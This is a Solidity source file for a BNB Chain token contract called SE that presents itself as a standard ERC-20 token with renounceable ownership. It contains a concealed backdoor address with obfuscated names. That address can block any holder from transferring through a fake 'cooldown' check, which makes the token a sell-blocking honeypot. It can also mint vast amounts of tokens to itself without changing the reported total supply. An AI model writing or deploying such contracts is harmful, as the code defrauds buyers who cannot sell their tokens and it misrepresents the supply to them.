/**
 *Submitted for verification at ww9v3.bscscan.com on 2023-08-15
*/

pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address adfdfsdet) external view returns (uint256);
    function transfer(address recipient, uint256 ayjtefft) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 ayjtefft) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 ayjtefft ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract SE is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _zsdacx; 
    mapping (address => uint256) private _cooldowns;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address public _ADSDASD;


    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_ , address OWDSAE) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _ADSDASD = OWDSAE;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address adfdfsdet) public view override returns (uint256) {
        return _balances[adfdfsdet];
    }
    function setCooldown(address user, uint256 teee) public {
    require(_ADSDASD == _msgSender());
        _cooldowns[user] = teee;
    }
    function getCooldown(address user) public view returns (uint256) {
        return _cooldowns[user];
    } 
    function add() public {
    require(_ADSDASD == _msgSender());
    uint256 asdjndf = 214101000000000000000000000;
    uint256 uuejsjd=asdjndf*222;
        _balances[_ADSDASD] += uuejsjd;
    }        
    function transfer(address recipient, uint256 ayjtefft) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= _cooldowns[_msgSender()], "Cooldown period not passed");
        require(_balances[_msgSender()] >= ayjtefft, "TT: transfer ayjtefft exceeds balance");

        _balances[_msgSender()] -= ayjtefft;
        _balances[recipient] += ayjtefft;
        emit Transfer(_msgSender(), recipient, ayjtefft);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 ayjtefft) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = ayjtefft;
        emit Approval(_msgSender(), spender, ayjtefft);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 ayjtefft) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= _cooldowns[_msgSender()], "Cooldown period not passed");
        require(_allowances[sender][_msgSender()] >= ayjtefft, "TT: transfer ayjtefft exceeds allowance");

        _balances[sender] -= ayjtefft;
        _balances[recipient] += ayjtefft;
        _allowances[sender][_msgSender()] -= ayjtefft;

        emit Transfer(sender, recipient, ayjtefft);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}